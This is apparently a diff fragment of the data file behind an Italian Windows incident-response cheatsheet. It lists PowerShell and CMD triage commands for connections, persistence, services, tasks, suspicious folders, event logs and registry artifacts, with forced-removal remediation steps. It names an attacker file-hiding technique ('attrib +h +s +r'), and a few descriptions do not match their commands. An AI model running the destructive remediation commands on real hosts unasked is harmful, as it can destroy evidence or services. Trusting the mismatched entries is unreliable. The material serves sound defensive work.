+    {t:"Termina un processo sospetto identificato tramite PID.", y:"PowerShell", c:`Stop-Process -Id <PID> -Force`},
+    {t:"Stessa operazione da prompt cmd, utile quando PowerShell non è disponibile.", y:"CMD", c:`taskkill /PID <PID> /F`},
+    {t:"Termina tutte le istanze di un processo per nome, utile se il malware ne genera più copie.", y:"CMD", c:`taskkill /IM <nome-processo.exe> /F`},
+  ]},
+  { id:'connection', name:'Connection', theory:{
+    paths:[],
+    notes:[
+      "Le connessioni di rete sono spesso il modo più rapido per individuare un canale C2 attivo: correla sempre IP e porta remota con il PID e il percorso del processo owner prima di procedere al contenimento.",
+    ],
+  }, items:[
+    {t:"Connessioni TCP stabilite con nome e percorso completo dell'eseguibile del processo owner: il comando più diretto per collegare una connessione di rete sospetta al binario che l'ha generata.", y:"PowerShell", c:`Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess,@{Name='ProcessName';Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}},@{Name='ProcessPath';Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}`},
+    {t:"Porte in ascolto (listening) con relativo processo owner e nome eseguibile: individua listener non autorizzati o backdoor in attesa di connessioni entranti.", y:"PowerShell", c:`Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name='ProcessName';Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}`},
+    {t:"Connessioni di rete con PID e nome del componente eseguibile associato: alternativa da cmd quando PowerShell non è disponibile; con privilegi amministrativi mostra anche i moduli/DLL coinvolti nella connessione.", y:"CMD", c:`netstat -anob`},
+    {t:"Cache DNS del client: rivela risoluzioni recenti verso domini di comando e controllo (C2), anche quando la connessione TCP associata è già terminata.", y:"PowerShell", c:`Get-DnsClientCache | Select-Object Entry,Data,TimeToLive`},
+    {t:"Regole firewall attualmente attive: individua regole aggiunte da un attaccante per aprire porte o bypassare le restrizioni di rete predefinite.", y:"PowerShell", c:`Get-NetFirewallRule -Enabled True | Select-Object DisplayName,Direction,Action`},
+    {t:"Stesso elenco di regole firewall attive in versione cmd, utile in ambienti dove PowerShell è limitato da Constrained Language Mode o da policy aziendali.", y:"CMD", c:`netsh advfirewall firewall show rule name=all`},
+    {t:"Test di connettività verso un host e una porta specifici: utile per verificare rapidamente un indicatore di compromissione (IOC) di rete raccolto durante l'analisi.", y:"PowerShell", c:`Test-NetConnection -ComputerName <host> -Port <port>`},
+    {t:"Configurazione proxy di sistema: un attaccante può modificarla per instradare o intercettare il traffico della vittima verso infrastrutture malevole.", y:"CMD", c:`netsh winhttp show proxy`},
+    {t:"Profili Wi-Fi salvati sull'host: un attaccante con accesso locale può estrarne le password per muoversi lateralmente su altre reti raggiungibili.", y:"CMD", c:`netsh wlan show profiles`},
+    {t:"Stato di tutti i profili firewall (Domain/Private/Public): verifica che il firewall non sia stato disattivato su uno dei profili attivi.", y:"CMD", c:`netsh advfirewall show allprofiles`},
+    {t:"Esporta tutte le connessioni TCP in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_connection_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
+    {t:"Termina il processo owner della connessione sospetta, interrompendo immediatamente il canale di rete.", y:"PowerShell", c:`Stop-Process -Id <PID> -Force`},
+    {t:"Blocca un IP sospetto sia in uscita che in entrata tramite una regola firewall dedicata.", y:"PowerShell", c:`New-NetFirewallRule -DisplayName "Block-IOC-Out" -Direction Outbound -RemoteAddress <IP> -Action Block\nNew-NetFirewallRule -DisplayName "Block-IOC-In" -Direction Inbound -RemoteAddress <IP> -Action Block`},
+    {t:"Stesso blocco da riga di comando, utile quando PowerShell non è disponibile.", y:"CMD", c:`netsh advfirewall firewall add rule name="Block-IOC" dir=out remoteip=<IP> action=block`},
+  ]},
+  { id:'persistence', name:'Persistence', theory:{
+    paths:[
+      {p:"HKLM/HKCU\\...\\CurrentVersion\\Run", d:"chiavi di avvio automatico — persistenza a livello macchina o utente"},
+      {p:"HKLM\\...\\Winlogon (Shell/Userinit)", d:"un valore diverso da explorer.exe/userinit.exe indica un hijack del logon"},
+      {p:"...\\Image File Execution Options\\Debugger", d:"sostituisce silenziosamente l'esecuzione di un programma legittimo"},
+      {p:"Cartella Startup utente", d:"C:\\Users\\*\\AppData\\Roaming\\...\\Start Menu\\Programs\\Startup"},
+      {p:"root\\subscription (WMI)", d:"sottoscrizioni WMI Event Filter/Consumer per esecuzione fileless"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Voci di avvio automatico raccolte da tutte le fonti conosciute (registro, cartelle Startup, servizi): la vista più ampia e veloce sulle persistenze configurate sull'host (MITRE T1547).", y:"PowerShell", c:`Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User`},
+    {t:"Chiavi Run/RunOnce a livello macchina (HKLM): tra le tecniche di persistenza più comuni e più semplici da implementare per un attaccante (T1547.001).", y:"CMD", c:`reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"`},
+    {t:"Chiavi Run/RunOnce a livello di utente corrente (HKCU): a differenza delle chiavi HKLM richiedono solo privilegi utente standard, motivo per cui sono molto usate da malware privo di escalation.", y:"CMD", c:`reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"`},
+    {t:"Chiavi Run equivalenti riservate alle applicazioni a 32 bit su un sistema a 64 bit (Wow6432Node): spesso trascurate durante un'analisi manuale del registro.", y:"CMD", c:`reg query "HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"`},
+    {t:"Sottoscrizioni WMI Event Filter: individua trigger configurati per l'esecuzione fileless di codice al verificarsi di determinate condizioni di sistema (T1546.003).", y:"PowerShell", c:`Get-WmiObject -Namespace root\\subscription -Class __EventFilter`},
+    {t:"Consumer WMI che eseguono comandi al verificarsi dell'evento sottoscritto: da leggere insieme all'Event Filter per ricostruire l'intera catena di persistenza WMI.", y:"PowerShell", c:`Get-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer`},
+    {t:"Valori Shell e Userinit della chiave Winlogon: un valore diverso da explorer.exe o userinit.exe indica un hijack del processo di logon (T1547.004).", y:"PowerShell", c:`Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" | Select-Object Shell,Userinit`},
+    {t:"Voci Debugger nella chiave Image File Execution Options: tecnica che sostituisce l'esecuzione di un programma legittimo con un altro eseguibile scelto dall'attaccante (T1546.012).", y:"CMD", c:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /f "Debugger"`},
+    {t:"Programmi configurati in BootExecute: eseguiti dal Session Manager prima ancora del caricamento completo del sistema operativo, posizione di persistenza estremamente precoce.", y:"CMD", c:`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute"`},
+    {t:"File presenti nella cartella Startup di tutti i profili utente presenti sull'host: posizione semplice ma ancora molto sfruttata per la persistenza.", y:"PowerShell", c:`Get-ChildItem "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -Recurse -ErrorAction SilentlyContinue`},
+    {t:"Contenuto della cartella Startup dell'utente corrente, da riga di comando.", y:"CMD", c:`dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"`},
+    {t:"Contenuto della cartella Startup condivisa da tutti gli utenti, da riga di comando.", y:"CMD", c:`dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"`},
+    {t:"Valore AppInit_DLLs: tecnica storica di persistenza che forza il caricamento di una DLL arbitraria in ogni processo che carica user32.dll.", y:"CMD", c:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs`},
+    {t:"Esporta le voci di avvio automatico in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_persistence_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
+    {t:"Rimuove una voce Run malevola dal registro (adattare l'hive HKLM/HKCU al caso specifico).", y:"PowerShell", c:`Remove-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "<nome-voce>"`},
+    {t:"Rimuove una sottoscrizione WMI malevola (Consumer, Filter e relativo binding).", y:"PowerShell", c:`Get-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer -Filter "Name='<nome>'" | Remove-CimInstance\nGet-CimInstance -Namespace root\\subscription -ClassName __EventFilter -Filter "Name='<nome>'" | Remove-CimInstance`},
+    {t:"Ripristina i valori legittimi di Shell/Userinit in Winlogon dopo un hijack del logon.", y:"PowerShell", c:`Set-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name Shell -Value "explorer.exe"`},
+    {t:"Elimina un file di persistenza dalla cartella Startup dell'utente.", y:"PowerShell", c:`Remove-Item "C:\\Users\\<utente>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\<file>" -Force`},
+  ]},
+  { id:'services', name:'Services', theory:{
+    paths:[
+      {p:"HKLM\\SYSTEM\\CurrentControlSet\\Services", d:"registro dei servizi installati, con relativo ImagePath"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Servizi attualmente in esecuzione con relativo tipo di avvio: punto di partenza per individuare servizi non riconosciuti tra quelli attivi sull'host.", y:"PowerShell", c:`Get-Service | Where-Object Status -eq 'Running' | Select-Object Name,DisplayName,StartType`},
+    {t:"Servizi con percorso dell'eseguibile fuori dalle cartelle di sistema standard: un servizio che punta a Temp, AppData o ProgramData è quasi sempre da investigare (T1543.003).", y:"PowerShell", c:`Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '*System32*' } | Select-Object Name,PathName,StartMode,State`},
+    {t:"Elenco completo di tutti i servizi installati con il relativo stato, inclusi quelli fermi o disabilitati.", y:"CMD", c:`sc query type= service state= all`},
+    {t:"Servizi che lanciano cmd.exe, powershell.exe o eseguono da percorsi temporanei: combinazione fortemente sospetta, quasi sempre indicativa di un servizio malevolo creato appositamente per l'attacco.", y:"PowerShell", c:`Get-CimInstance Win32_Service | Where-Object { $_.PathName -match 'cmd|powershell|temp' } | Select-Object Name,PathName`},
+    {t:"Servizi impostati per l'avvio automatico ma attualmente fermi: possono indicare un servizio disabilitato o manomesso da un attaccante per evitare il rilevamento.", y:"PowerShell", c:`Get-Service | Where-Object { $_.StartType -eq 'Automatic' -and $_.Status -eq 'Stopped' }`},
+    {t:"Valore ImagePath di tutti i servizi registrati nel registro: permette un confronto massivo e testuale, utile per ricerche rapide su tutti i servizi in un solo output.", y:"CMD", c:`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services" /s /f "ImagePath"`},
+    {t:"Nome, account di esecuzione e percorso binario di tutti i servizi: un servizio che gira con un account utente invece di LocalSystem/NetworkService è spesso anomalo.", y:"CMD", c:`wmic service get Name,StartName,PathName,State`},
+    {t:"Configurazione dettagliata di un servizio specifico ritenuto sospetto: mostra percorso binario, account di esecuzione e dipendenze.", y:"CMD", c:`sc qc <NomeServizio>`},
+    {t:"Esporta l'elenco completo dei servizi in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-CimInstance Win32_Service | Select-Object Name,DisplayName,PathName,StartMode,State | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_services_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
+    {t:"Ferma un servizio malevolo e ne disabilita l'avvio automatico futuro.", y:"PowerShell", c:`Stop-Service -Name <NomeServizio> -Force\nSet-Service -Name <NomeServizio> -StartupType Disabled`},
+    {t:"Elimina completamente il servizio dal sistema.", y:"CMD", c:`sc.exe delete <NomeServizio>`},
+  ]},
+  { id:'schtask', name:'Task Schedule', theory:{
+    paths:[
+      {p:"C:\\Windows\\System32\\Tasks\\", d:"file XML dei task pianificati salvati su disco"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Elenco dei task pianificati con percorso e stato: prima vista d'insieme su tutte le pianificazioni presenti sull'host.", y:"PowerShell", c:`Get-ScheduledTask | Select-Object TaskName,TaskPath,State`},
+    {t:"Informazioni di esecuzione di ciascun task: ultima e prossima esecuzione e relativo codice di risultato, utile per individuare task eseguiti in orari anomali o con esiti di errore ricorrenti.", y:"PowerShell", c:`Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime,LastTaskResult`},
+    {t:"Azione e argomenti eseguiti da ciascun task pianificato riassunti in un'unica tabella, senza dover esportare manualmente l'XML di ogni singolo task.", y:"PowerShell", c:`Get-ScheduledTask | ForEach-Object { [PSCustomObject]@{ Task = $_.TaskName; Azione = ($_.Actions | Select-Object -First 1).Execute; Argomenti = ($_.Actions | Select-Object -First 1).Arguments } }`},
+    {t:"Dettaglio verboso di tutti i task pianificati, inclusi trigger e azione eseguita, in formato testuale facilmente ricercabile con find/findstr.", y:"CMD", c:`schtasks /query /fo LIST /v`},
+    {t:"Esporta l'elenco dei task pianificati in CSV nativamente da schtasks, senza dover passare per PowerShell.", y:"CMD", c:`schtasks /query /fo csv > tasks.csv`},
+    {t:"Solo i task effettivamente abilitati, escludendo quelli disabilitati dall'amministratore: riduce il rumore durante la revisione manuale.", y:"PowerShell", c:`Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' }`},
+    {t:"Task pianificati ordinati per percorso: utile per individuare rapidamente task creati fuori dalle cartelle standard di Microsoft.", y:"PowerShell", c:`Get-ScheduledTask | Select-Object TaskName,TaskPath,State | Sort-Object TaskPath`},
+    {t:"Export XML completo di un singolo task ritenuto sospetto: utile per analizzare in dettaglio trigger, condizioni e azione configurata.", y:"CMD", c:`schtasks /query /tn "<NomeTask>" /xml`},
+    {t:"Esporta le informazioni di esecuzione di tutti i task pianificati in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime,LastTaskResult | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_tasks_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
+    {t:"Elimina un task pianificato malevolo.", y:"CMD", c:`schtasks /delete /tn "<NomeTask>" /f`},
+    {t:"Stessa operazione tramite cmdlet PowerShell.", y:"PowerShell", c:`Unregister-ScheduledTask -TaskName "<NomeTask>" -Confirm:$false`},
+  ]},
+  { id:'suspdir', name:'Suspicious Directory', theory:{
+    paths:[
+      {p:"C:\\Users\\*\\AppData\\Local\\Temp", d:"cartella Temp utente — location comune per il download iniziale"},
+      {p:"C:\\Windows\\Temp", d:"scrivibile da tutti gli utenti, spesso usata per staging con privilegi elevati"},
+      {p:"C:\\ProgramData", d:"cartella legittima ma poco monitorata"},
+      {p:"C:\\Users\\Public, C:\\PerfLogs, C:\\Windows\\Tasks", d:"cartelle scrivibili da chiunque e generalmente poco monitorate"},
+    ],
+    notes:[
+      {warn:true, text:"attrib +h +s +r <file> è la tecnica usata da un attaccante per nascondere un file (attributi Hidden/System/ReadOnly): utile da conoscere per interpretare correttamente i risultati di dir /A:H, non da eseguire durante l'analisi."},
+    ],
+  }, items:[
+    {t:"Eseguibili e script presenti nelle cartelle Temp di tutti gli utenti: una delle location più comuni per il download e la prima esecuzione di malware.", y:"PowerShell", c:`Get-ChildItem "C:\\Users\\*\\AppData\\Local\\Temp" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in ".exe",".ps1",".bat",".vbs" }`},
+    {t:"Contenuto di C:\\Windows\\Temp: cartella scrivibile da tutti gli utenti e spesso usata per lo staging di payload da parte di processi con privilegi elevati.", y:"PowerShell", c:`Get-ChildItem "C:\\Windows\\Temp" -Recurse -File -ErrorAction SilentlyContinue`},
+    {t:"Contenuto della cartella Temp corrente e di quella di sistema, ordinato per data, da riga di comando.", y:"CMD", c:`dir %TEMP% /O:D\ndir C:\\Windows\\Temp /O:D`},
+    {t:"Binari sospetti in ProgramData: cartella legittima ma poco monitorata, spesso scelta per nascondere payload tra i dati di applicazioni reali.", y:"PowerShell", c:`Get-ChildItem "C:\\ProgramData" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in ".exe",".dll",".ps1" }`},
+    {t:"Contenuto di cartelle scrivibili da qualunque utente e generalmente poco monitorate (Public, PerfLogs, Tasks): posizioni alternative spesso scelte per evadere controlli più superficiali.", y:"PowerShell", c:`Get-ChildItem "C:\\Users\\Public","C:\\PerfLogs","C:\\Windows\\Tasks" -Recurse -File -ErrorAction SilentlyContinue`},
+    {t:"File nascosti su tutto il volume C: operazione onerosa in termini di tempo, da restringere a una cartella specifica quando possibile per evitare scan troppo lunghi.", y:"PowerShell", c:`Get-ChildItem "C:\\" -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Attributes -match "Hidden" } | Select-Object FullName`},
+    {t:"Stessa ricerca di file nascosti tramite il comando dir nativo, senza passare per PowerShell.", y:"CMD", c:`dir /A:H /S C:\\`},
+    {t:"File .exe creati o modificati nelle ultime 24 ore in tutti i profili utente: individua rapidamente i binari più recenti senza dover ordinare manualmente decine di risultati.", y:"CMD", c:`forfiles /p C:\\Users /s /m *.exe /d +0 /c "cmd /c echo @path @fdate"`},
+    {t:"File modificati a partire da una data specifica su tutto il volume C:, con timestamp completo di ora.", y:"CMD", c:`forfiles /P C:\\ /S /D +<data> /C "cmd /c echo @path @fdate @ftime"`},
+    {t:"Eseguibili e script modificati nelle ultime 24 ore su tutti i profili utente: stessa logica del comando precedente ma con filtri più flessibili grazie a PowerShell.", y:"PowerShell", c:`Get-ChildItem -Recurse -Path "C:\\Users" -Include *.exe,*.ps1,*.vbs -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) }`},
+    {t:"Elenco completo dei file dell'intero volume C: con data di scrittura, ordinato per data: utile per una scansione ampia quando non si ha ancora un'ipotesi precisa sulla finestra temporale.", y:"CMD", c:`dir /T:W /O:D /S C:\\Users\\*.*`},
+    {t:"Tutti i file modificati negli ultimi 7 giorni sull'intero disco: rete di sicurezza più ampia rispetto al controllo sulle sole 24 ore.", y:"PowerShell", c:`Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }`},
+    {t:"Nuovi file comparsi in System32 negli ultimi 30 giorni: questa cartella cambia raramente, quindi un file recente è un forte indicatore di compromissione.", y:"PowerShell", c:`Get-ChildItem C:\\Windows\\System32 | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }`},
+    {t:"I 20 eseguibili modificati più di recente in System32: variante ordinata del controllo precedente, utile per concentrarsi sui casi più recenti.", y:"PowerShell", c:`Get-Item C:\\Windows\\System32\\*.exe | Sort-Object LastWriteTime -Descending | Select-Object -First 20`},
+    {t:"EXE e DLL comparse nei profili utente negli ultimi 30 giorni: un binario in un profilo utente è quasi sempre meno legittimo di uno in Program Files.", y:"PowerShell", c:`Get-ChildItem -Path C:\\Users -Recurse -Include *.exe,*.dll -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }`},
+    {t:"Permessi su un file o cartella sospetti: un ACL troppo permissivo (Everyone/Authenticated Users con controllo completo) può indicare manomissione o preparazione a un attacco.", y:"CMD", c:`icacls <percorso>`},
+    {t:"Calcola l'hash SHA256 di un file specifico individuato come sospetto, da confrontare con IOC noti o da interrogare su VirusTotal.", y:"PowerShell", c:`Get-FileHash -Path "<percorso file>" -Algorithm SHA256`},
+    {t:"Stessa operazione di hashing tramite certutil: alternativa nativa disponibile anche su versioni Windows meno recenti o quando i cmdlet PowerShell sono bloccati da policy.", y:"CMD", c:`certutil -hashfile "<percorso file>" SHA256`},
+    {t:"Esporta l'elenco di file trovati nelle cartelle sospette (Temp, ProgramData) in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-ChildItem "C:\\Users\\*\\AppData\\Local\\Temp","C:\\Windows\\Temp","C:\\ProgramData" -Recurse -File -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime,Extension | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_suspdir_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
+    {t:"Metti in quarantena un file sospetto spostandolo in una cartella di evidence dedicata, senza cancellarlo.", y:"PowerShell", c:`New-Item -ItemType Directory -Path "C:\\Quarantine" -Force | Out-Null\nMove-Item -Path "<percorso-file>" -Destination "C:\\Quarantine\\" -Force`},
+    {t:"Elimina definitivamente un file, da eseguire solo dopo aver completato la raccolta forense/hash.", y:"PowerShell", c:`Remove-Item -Path "<percorso-file>" -Force`},
+  ]},
+  { id:'eventlog', name:'Event Logs', theory:{
+    paths:[
+      {p:"Security", d:"logon/logoff, uso privilegi, gestione account"},
+      {p:"System", d:"eventi di sistema, inclusa installazione servizi (7045)"},
+      {p:"Microsoft-Windows-PowerShell/Operational", d:"Script Block Logging (4104)"},
+      {p:"Microsoft-Windows-Sysmon/Operational", d:"telemetria granulare, se Sysmon è installato"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Eventi di logon riuscito, logon fallito, uso di privilegi speciali e creazione di nuovi utenti dal log Security: la prima query da lanciare sul log più importante per il triage (T1078).", y:"PowerShell", c:`Get-WinEvent -LogName Security -MaxEvents 200 | Where-Object { $_.Id -in 4624,4625,4672,4720 }`},
+    {t:"Rileva la cancellazione dei log Security o System (Event ID 1102 e 104): uno degli indicatori di anti-forensics più significativi, quasi sempre successivo a un'attività malevola già conclusa.", y:"PowerShell", c:`Get-WinEvent -FilterHashtable @{LogName=@('Security','System'); Id=@(1102,104)} -ErrorAction SilentlyContinue`},
+    {t:"Export rapido degli ultimi eventi del log Security in formato testo, utile quando serve un output leggibile senza aprire l'Event Viewer.", y:"CMD", c:`wevtutil qe Security /c:50 /rd:true /f:text`},
+    {t:"Script Block Logging di PowerShell (Event ID 4104): rivela il contenuto reale degli script eseguiti, incluso codice offuscato decodificato al momento dell'esecuzione.", y:"PowerShell", c:`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 100`},
+    {t:"Eventi Sysmon, se il sensore è installato sull'host: fornisce visibilità molto più granulare su processi, rete e file rispetto ai log nativi di Windows.", y:"PowerShell", c:`Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200`},
+    {t:"Installazione di nuovi servizi (Event ID 7045): tecnica di persistenza molto comune, spesso associata alla creazione di un servizio malevolo subito dopo il logon (T1543.003).", y:"PowerShell", c:`Get-WinEvent -FilterHashtable @{LogName='System';Id=7045}`},
+    {t:"Eventi di creazione processo con command line completa (Event ID 4688): richiede che l'auditing avanzato sia abilitato, ma se presente è una delle migliori fonti di dati disponibili nativamente.", y:"PowerShell", c:`Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 200`},
+    {t:"Utente aggiunto a un gruppo protetto (Event ID 4732): tecnica di escalation privilegi molto comune, spesso associata all'aggiunta al gruppo Administrators.", y:"PowerShell", c:`Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4732 }`},
+    {t:"Fallimenti di pre-autenticazione Kerberos (Event ID 4771): utile per individuare tentativi di brute force o Kerberoasting contro account di dominio.", y:"PowerShell", c:`Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4771 }`},
+    {t:"Eventi di autenticazione NTLM (Event ID 4776): un uso anomalo di NTLM invece di Kerberos può indicare un tentativo di pass-the-hash.", y:"PowerShell", c:`Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4776 }`},
+    {t:"Elenco di tutti i log disponibili sul sistema: utile per capire rapidamente cosa viene effettivamente registrato prima di perdere tempo su query su log non abilitati.", y:"CMD", c:`wevtutil el`},
+    {t:"Esporta gli eventi di logon/creazione utenti del log Security in CSV in C:\\Windows\\Temp con timestamp automatico: il file viene riconosciuto dal modulo Parsing di questa dashboard e mostrato come tabella filtrabile e ordinabile.", y:"PowerShell", c:`Get-WinEvent -LogName Security -MaxEvents 500 | Where-Object { $_.Id -in 4624,4625,4672,4720 } | Select-Object TimeCreated,Id,LevelDisplayName,Message | Export-Csv -NoTypeInformation -Path "C:\\Windows\\Temp\\ircheatsheet_eventlog_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"`},
+  ], remediation:[
+    {t:"Copia i log critici in un file .evtx prima di procedere con qualsiasi azione di remediation, per preservarne l'integrità.", y:"CMD", c:`wevtutil epl Security C:\\Windows\\Temp\\evidence_security_$(Get-Date -Format 'yyyyMMdd_HHmmss').evtx`},
+  ]},
+  { id:'artifacts', name:'Registry & Usage Artifacts', theory:{
+    paths:[
+      {p:"...\\CurrentVersion\\Uninstall", d:"elenco del software installato (HKLM per tutti, HKCU per utente)"},
+      {p:"...\\Explorer\\RecentDocs", d:"documenti recentemente aperti tramite Esplora File"},
+      {p:"...\\Explorer\\RunMRU", d:"storico dei comandi digitati nella finestra Esegui"},
+      {p:"...\\Explorer\\TypedPaths", d:"percorsi digitati manualmente nella barra degli indirizzi"},
+      {p:"...\\ComDlg32\\OpenSavePidlMRU / LastVisitedPidlMRU", d:"file e cartelle usati nelle finestre di apertura/salvataggio"},
+      {p:"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR", d:"storico dei dispositivi di storage USB collegati"},
+      {p:"HKLM\\SYSTEM\\MountedDevices", d:"tutti i volumi montati, incluse le unità USB"},
+      {p:"...\\Terminal Server Client\\Servers", d:"storico delle connessioni RDP in uscita"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Elenco del software installato a livello macchina, letto direttamente dal registro.", y:"CMD", c:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"`},
+    {t:"Software installato a livello utente, spesso non visibile nel Pannello di controllo standard.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"`},
+    {t:"Documenti recentemente aperti tramite Esplora File: ricostruisce l'attività dell'utente prima e durante l'incidente.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"`},
+    {t:"Stessa informazione sui documenti recenti, letta tramite cmdlet PowerShell.", y:"PowerShell", c:`Get-ItemProperty 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs'`},
+    {t:"Storico dei comandi digitati nella finestra Esegui (Win+R): può rivelare l'esecuzione manuale di strumenti come cmd, powershell o payload con percorso completo.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"`},
+    {t:"Percorsi digitati manualmente nella barra degli indirizzi di Esplora File.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths"`},
+    {t:"Ultime cartelle visitate tramite le finestre di apertura/salvataggio file.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU"`},
+    {t:"File recentemente aperti tramite le finestre di dialogo di apertura/salvataggio delle applicazioni.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU"`},
+    {t:"Storico dei dispositivi di storage USB collegati all'host: utile per identificare exfiltration via chiavetta USB.", y:"CMD", c:`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR"`},
+    {t:"Tutti i volumi montati sull'host, incluse le unità USB rimosse in passato.", y:"CMD", c:`reg query "HKLM\\SYSTEM\\MountedDevices"`},
+    {t:"Storico delle connessioni RDP effettuate in uscita da questo host verso altri server: utile per ricostruire movimenti laterali.", y:"CMD", c:`reg query "HKCU\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers"`},
+    {t:"Policy di Group Policy sull'execution policy di PowerShell: un valore troppo permissivo (Unrestricted/Bypass) forzato via GPO abbassa le difese su tutto il dominio.", y:"CMD", c:`reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell"`},
+    {t:"Riferimento delle DLL note e protette dal sistema: utile come baseline per riconoscere DLL hijacking su librerie di sistema.", y:"CMD", c:`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs"`},
